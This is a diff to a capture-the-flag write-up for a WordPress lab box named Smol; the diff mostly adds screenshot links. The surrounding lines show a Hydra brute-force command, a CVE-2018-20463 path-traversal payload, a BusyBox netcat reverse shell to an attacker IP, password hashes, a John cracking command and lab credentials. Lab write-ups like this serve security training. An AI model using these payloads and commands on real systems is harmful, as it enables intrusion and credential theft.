@@ -46,6 +46,7 @@ Discovered common WordPress paths:
 * `/wp-login.php`
 * `/wp-content/`
 * `/wp-includes/`
+
 ![Landing Page](images/Smol/img2.jpg)
 
 Initial brute-force attempt on `wp-login` using Hydra failed:
@@ -61,14 +62,18 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt smoi.thm http-post-form "/wp-
 Using plugin fuzzing:
 
 ```bash
-ffuf -u http://smoi.thm/wp-content/plugins/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ffuf -u http://smoi.thm/wp-content/plugins/FUZZ -w /Path/to/wordlist
 ```
 
 Found vulnerable plugin: **JSmol2WP**
 
+![Landing Page](images/Smol/img3.jpg)
+
 ### Arbitrary File Read - CVE-2018-20463:
 
 Used the following payload to read `wp-config.php`:
+
+![Landing Page](images/Smol/img4.jpg)
 
 ```
 /wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../../wp-config.php
@@ -83,6 +88,8 @@ DB_PASSWORD: kbLSF2Vop#lw3rjDZ629*Z%G
 
 Logged into WordPress as `wpuser` and found a private to-do list:
 
+![Landing Page](images/Smol/img5.jpg)
+
 > "\[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of 'Hello Dolly' plugin as the site's code revision."
 
 ---
@@ -96,6 +103,8 @@ Used the same path traversal technique:
 ```
 
 ### Backdoor Found:
+
+![Landing Page](images/Smol/img6.jpg)
 
 Inside the Hello Dolly plugin, discovered:
 
@@ -114,6 +123,8 @@ http://<target-ip>/wp-admin/index.php?cmd=id
 ```
 
 Tested reverse shells in Python, PHP, and curl — no success. Finally, this **BusyBox payload** worked:
+
+![Landing Page](images/Smol/img7.jpg)
 
 ```bash
 busybox nc 10.8.137.194 9001 -e sh
@@ -137,6 +148,8 @@ Located suspicious file:
 
 Extracted password hashes:
 
+![Landing Page](images/Smol/img8.jpg)
+
 ```
 $P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
 $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
@@ -148,6 +161,7 @@ Cracked using John:
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass hash.txt
 ```
+![Landing Page](images/Smol/img9.jpg)
 
 Results:
 
@@ -182,6 +196,9 @@ cat /home/diego/user.txt
 Couldn’t unzip on target (permission issue), so:
 
 * Switched to `think` via SSH key access
+
+![Landing Page](images/Smol/img10.jpg)
+ 
 * Then to `gege` via `su` (no password required)
 * Hosted file using:
 
@@ -204,6 +221,8 @@ Password: P@ssw0rdxavi@
 ```
 
 Switched to xavi:
+
+![Landing Page](images/Smol/img11.jpg)
 
 ```bash
 su xavi
